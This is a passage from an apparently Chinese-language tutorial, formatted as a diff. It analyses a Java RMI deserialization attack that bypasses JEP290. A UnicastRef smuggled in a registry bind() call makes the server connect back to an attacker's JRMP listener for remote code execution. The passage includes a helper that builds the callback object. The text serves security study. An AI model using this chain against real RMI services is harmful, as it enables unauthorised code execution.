@@ -1,0 +1,183 @@
+  2. 我们恶意的JRMP服务端在原本是报错信息的位置写入利用链，序列化成数据包返回到JRMP客户端（RMI注册端）。
+  3. 由于JRMP客户端的反序列化过程不存在JEP290的过滤器，所以我们的payload可以成功被执行，从而完成RCE。
+那么显而易见这个攻击组合中 **唯一缺失的板块** 就是：让原本目标是直接命令执行的第一条bind攻击，转换目标成
+**让RMI注册端去作为JRMP客户端向我们指定的JRMP服务端去发起请求** ，从而完成一整个攻击链的衔接，这需要我们去寻
+**找一个所有对象都在白名单中的Gadget** 去完成这一任务。
+>
+> 细想这个过程，会发现这个过程跟fastjson的JNDI注入攻击模式很相似，用一个payload去诱导目标服务器发起一个外部连接，连接到我们控制的恶意服务，恶意服务再去返回payload从而在服务器上完成命令执行。
+>
+>
+> 它也跟我们所说的内网渗透中的免杀平台很像，我们只需要免杀平台免杀（对应JRMP攻击链逃过JEP290），然后外部命令都在免杀平台（通过JRMP攻击链）上执行。
+理顺一下我们的目标：
+  1. 我们要找一个Gadget，它在服务端的反序列化的过程中，会对我们指定的JRMP服务器发起JRMP连接。
+  2. 在找到这个Gadget之后，我们需要进一步将它封装进入`register.bind(String,Remote)`中。（为了满足客户端的格式需求）
+那么我们先来第一步：找Gadget。
+假如让我们自己真的从零开始找这个Gadget，我们应该先找出所有会向服务器发起JRMP请求的最底层方法，然后向上看何处调用了这个方法来进行一层层逆推，直到找到一个对象的反序列化入口（比如readobject）。那么再从反序列化入口反过来拎起来就是一个Gadget。
+但是在看别人的Gadget的时候就从反序列化口子开始看便于理解。
+#### UnicastRef对象
+Ysoserial中的payloads-JRMPClient就是一个可以完成JRMP服务器发起JRMP连接的调用栈：
+    /** 
+     * UnicastRef.newCall(RemoteObject, Operation[], int, long)（！！JRMP请求的发送处！！）
+     * DGCImpl_Stub.dirty(ObjID[], long, Lease)（这里是我们上面JRMP服务端打客户端，客户端的反序列化触发处）
+     * DGCClient$EndpointEntry.makeDirtyCall(Set, long)
+     * DGCClient$EndpointEntry.registerRefs(List)
+     * DGCClient.registerRefs(Endpoint, List)
+     ------这里实际上不是一个连贯的调用栈,之后说明-----     * LiveRef.read(ObjectInput, boolean)
+     * UnicastRef.readExternal(ObjectInput)（！！反序列化的入口！！）
+可能有的同学对于`UnicastRef.readExternal()`作为反序列化的入口有点疑惑，其实我们在 **JAVA反序列化-基础**
+中提到过这个。反序列化的入口其实不止readobject()，还有readExternal()，只不过后者稍微少见点。
+在实际触发的时候，这个触发过程其实不是我们常见的readobject进来一路向下就直接完成触发的调用栈，它其实分为两部分
+  1. readObject()：组装填入ref
+  2. releaseInputStream()：统一处理ref
+看bind的反序列化过程：
+    try {
+        var9 = var2.getInputStream();//var2是我们的输入流
+        var7 = (String)var9.readObject();//略过
+        //payload在这，在readobject中递归调用属性，进入UnicastRef#readExternal
+        //在其中完成了ref的填装
+        var80 = (Remote)var9.readObject();
+    } catch (ClassNotFoundException | IOException var77) {
+        throw new UnmarshalException("error unmarshalling arguments", var77);
+    } finally {
+        //在这里处理ref的时候才真正完成了触发
+        var2.releaseInputStream();
+    }
+也就是说实际上 **JRMP服务器发起JRMP连接** 的时候是在`var2.releaseInputStream();`的语句中。
+我们从`var9.readObject();`反序列化入口开始跟一遍：
+`sun.rmi.server.UnicastRef#readExternal`:
+    public void readExternal(ObjectInput in)
+            throws IOException, ClassNotFoundException
+        {
+            ref = LiveRef.read(in, false);//---进入此处----        }
+`sun.rmi.transport.LiveRef#read`：
+    public static LiveRef read(ObjectInput in, boolean useNewFormat)
+            throws IOException, ClassNotFoundException
+        {
+            Endpoint ep;
+            ObjID id;
+            // 从输入流中读取endpoint, id和result flag
+            // 一个固定的格式版本判断，根据JDK版本有关
+            if (useNewFormat) {
+                ep = TCPEndpoint.read(in);
+            } else {
+                //读取
+                ep = TCPEndpoint.readHostPortFormat(in);
+            }
+            id = ObjID.read(in);
+            boolean isResultStream = in.readBoolean();
+            //恢复一个LiveRef对象(可以理解为一个连接对象)
+            //此处可以由我们的序列化对象进行指定。
+            LiveRef ref = new LiveRef(id, ep, false);
+            //判断输入流in是不是已经是一个对象流了，这里都会为true
+            if (in instanceof ConnectionInputStream) {
+                ConnectionInputStream stream = (ConnectionInputStream)in;
+                // 保存ref以在所有参数/返回都被解析后再发送"dirty"调用。
+                stream.saveRef(ref);
+                if (isResultStream) {
+                    stream.setAckNeeded();
+                }
+            } else {
+                //-----这里会产生一个误区，实际上我们进入的不是这个registerRefs----                DGCClient.registerRefs(ep, Arrays.asList(new LiveRef[] { ref }));
+            }
+            return ref;
+        }
+我们会进入`stream.saveRef(ref);`中，将ref填入流中的`incomingRefTable`字段，再之后统一解析。
+然后readobject就执行完了，进入第二步 **releaseInputStream 触发**
+`sun.rmi.transport.StreamRemoteCall#releaseInputStream`：
+    public void releaseInputStream() throws IOException {
+            try {
+                if (this.in != null) {
+                    //...省略
+                    //进入此处，统一处理去DGC注册之前readobject解析出来的ref
+                    this.in.registerRefs();
+                    this.in.done(this.conn);
+                }
+                this.conn.releaseInputStream();
+            } finally {
+                this.in = null;
+            }
+        }
+`sun.rmi.transport.ConnectionInputStream#registerRefs`:从之前readobject语句解析出来的`incomingRefTable`中读取ref。
+    void registerRefs() throws IOException {
+        if (!this.incomingRefTable.isEmpty()) {
+            //遍历incomingRefTable
+            Iterator var1 = this.incomingRefTable.entrySet().iterator();
+            while(var1.hasNext()) {
+                Entry var2 = (Entry)var1.next();
+                //开始一个个去DGC注册
+                DGCClient.registerRefs((Endpoint)var2.getKey(), (List)var2.getValue());
+            }
+        }
+    }
+然后就回到了yso里面的调用栈的下半部分：`sun.rmi.transport.DGCClient#registerRefs`：
+    static void registerRefs(Endpoint ep, List refs) {
+            EndpointEntry epEntry;
+            do {
+                //从给定的ep中查找引用对象入口
+                //这里就是我们调用栈下面一直跑的部分。
+                epEntry = EndpointEntry.lookup(ep);
+                //去该入口注册引用对象，如果不成功循环注册，直到成功。
+            } while (!epEntry.registerRefs(refs));//----进入此处---        }
+`sun.rmi.transport.DGCClient.EndpointEntry#registerRefs`:
+    public boolean registerRefs(List refs) {
+                assert !Thread.holdsLock(this);
+                Set refsToDirty = null;     // entries for refs needing dirty
+                long sequenceNum;           // sequence number for dirty call
+                //阻塞执行，去遍历查询LiveRef实例
+                synchronized (this) {
+                    //省略此处代码，就是做遍历查询的事情
+                }
+                //为所有结果参与DGC垃圾回收机制注册
+                //------进入此处------                makeDirtyCall(refsToDirty, sequenceNum);
+                return true;
+            }
+`sun.rmi.transport.DGCClient.EndpointEntry#makeDirtyCall`:(这里会发出DGC客户端的dirty请求)
+    private void makeDirtyCall(Set refEntries, long sequenceNum) {
+                assert !Thread.holdsLock(this);
+                //根据refEntries得到注册用的ids
+                ObjID[] ids;
+                if (refEntries != null) {
+                    ids = createObjIDArray(refEntries);
+                } else {
+                    ids = emptyObjIDArray;
+                }
+                long startTime = System.currentTimeMillis();
+                try {
+                    //进入此处，进行dirty请求
+                    Lease lease =
+                        dgc.dirty(ids, sequenceNum, new Lease(vmid, leaseValue));
+由于这里是一个接口，静态分析的话，我们需要使用ctrl+alt+B，进入`sun.rmi.transport.DGCImpl_Stub#dirty`
+    public Lease dirty(ObjID[] var1, long var2, Lease var4) throws RemoteException {
+            try {
+                RemoteCall var5 = super.ref.newCall(this, operations, 1, -669196253586618813L);
+                try {
+                    ObjectOutput var6 = var5.getOutputStream();
+                    var6.writeObject(var1);
+                    var6.writeLong(var2);
+                    var6.writeObject(var4);
+                } catch (IOException var20) {
+                    throw new MarshalException("error marshalling arguments", var20);
+                }
+                //JRMP服务端打JRMP客户端的反序列化触发点在这里面
+                super.ref.invoke(var5);
+这里就很熟悉了，JRMP服务端打JRMP客户端，JRMP客户端的漏洞触发点就在这。
+那么也就是说 **UnicastRef对象的readExternal方法作为反序列化入口的话**
+，我们可以通过控制序列化的内容使服务器向我们指定的服务器发起JRMP连接（通过DGC层的dirty方法发起），再通过之前讲到的JRMP客户端报错信息反序列化点完成RCE。
+我们把之前的攻击过程调试一下看下，同样在CC链的最后命令执行处下断点：
+调用栈,应该是由于服务端线程处理的特性（？）发生了变化，但是最后核心部分是没问题的。（UnicastRef的readExternal处作为入口下断点也是可以看到的，但是之后会跑偏，最后再到这部分）
+> 本地实验发现一个有趣的地方，这里会不断循环，一直请求我们恶意JRMP-> Listener，从而不断完成远程代码执行的情况。原因应该是因为分析代码的时候的while循环导致的（这就是我们反序列化触发栈发生变动的原因。），非常有趣，仿佛一个天然发心跳包的木马一样。
+知道服务端反序列化处的触发流程之后，我们来看payload的构造。
+一个基础的可以指定连接目标的UnicastRef对象：
+    //让受害者主动去连接的攻击者的JRMPlister的host和port
+    public static UnicastRef generateUnicastRef(String host, int port) {
+        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
+        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
+        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
+        return new sun.rmi.server.UnicastRef(liveRef);
+    }
+如果这个对象在目标服务器反序列化成功了，就可以顺着之前分析的反序列化过程向外发起连接。 **但是如何让这个对象反序列化呢？** 还需要进一步的封装。
+#### 与bind操作进行拼接
+我们的目标是：将UnicastRef对象封装进入`register.bind(String,Remote)`的Remote参数中，从而在反序列化Remote参数的时候因为反序列化的递归的特性，进行UnicastRef对象的反序列化。那又回归到了前面讨论过的问题，如何将UnicastRef对象封装成Remote类型：
+  1. 压根不封装，跟Barmie工具一样自实现通讯协议，直接发送UnicastRef（因为其实只有客户端上层函数需要remote类型的输入，服务端并没有要求是remote类型，都会反序列化）
+  2. 跟RMIRegisterExploit一样，使用 **动态代理** 来实现封装
+回一下动态代理封装的原理：将我们的payload放在拦截器的类参数中，然后封装拦截器成Remote类型，反序列化的时候就会反序列化拦截器里面的payload的参数，从而形成反序列化。
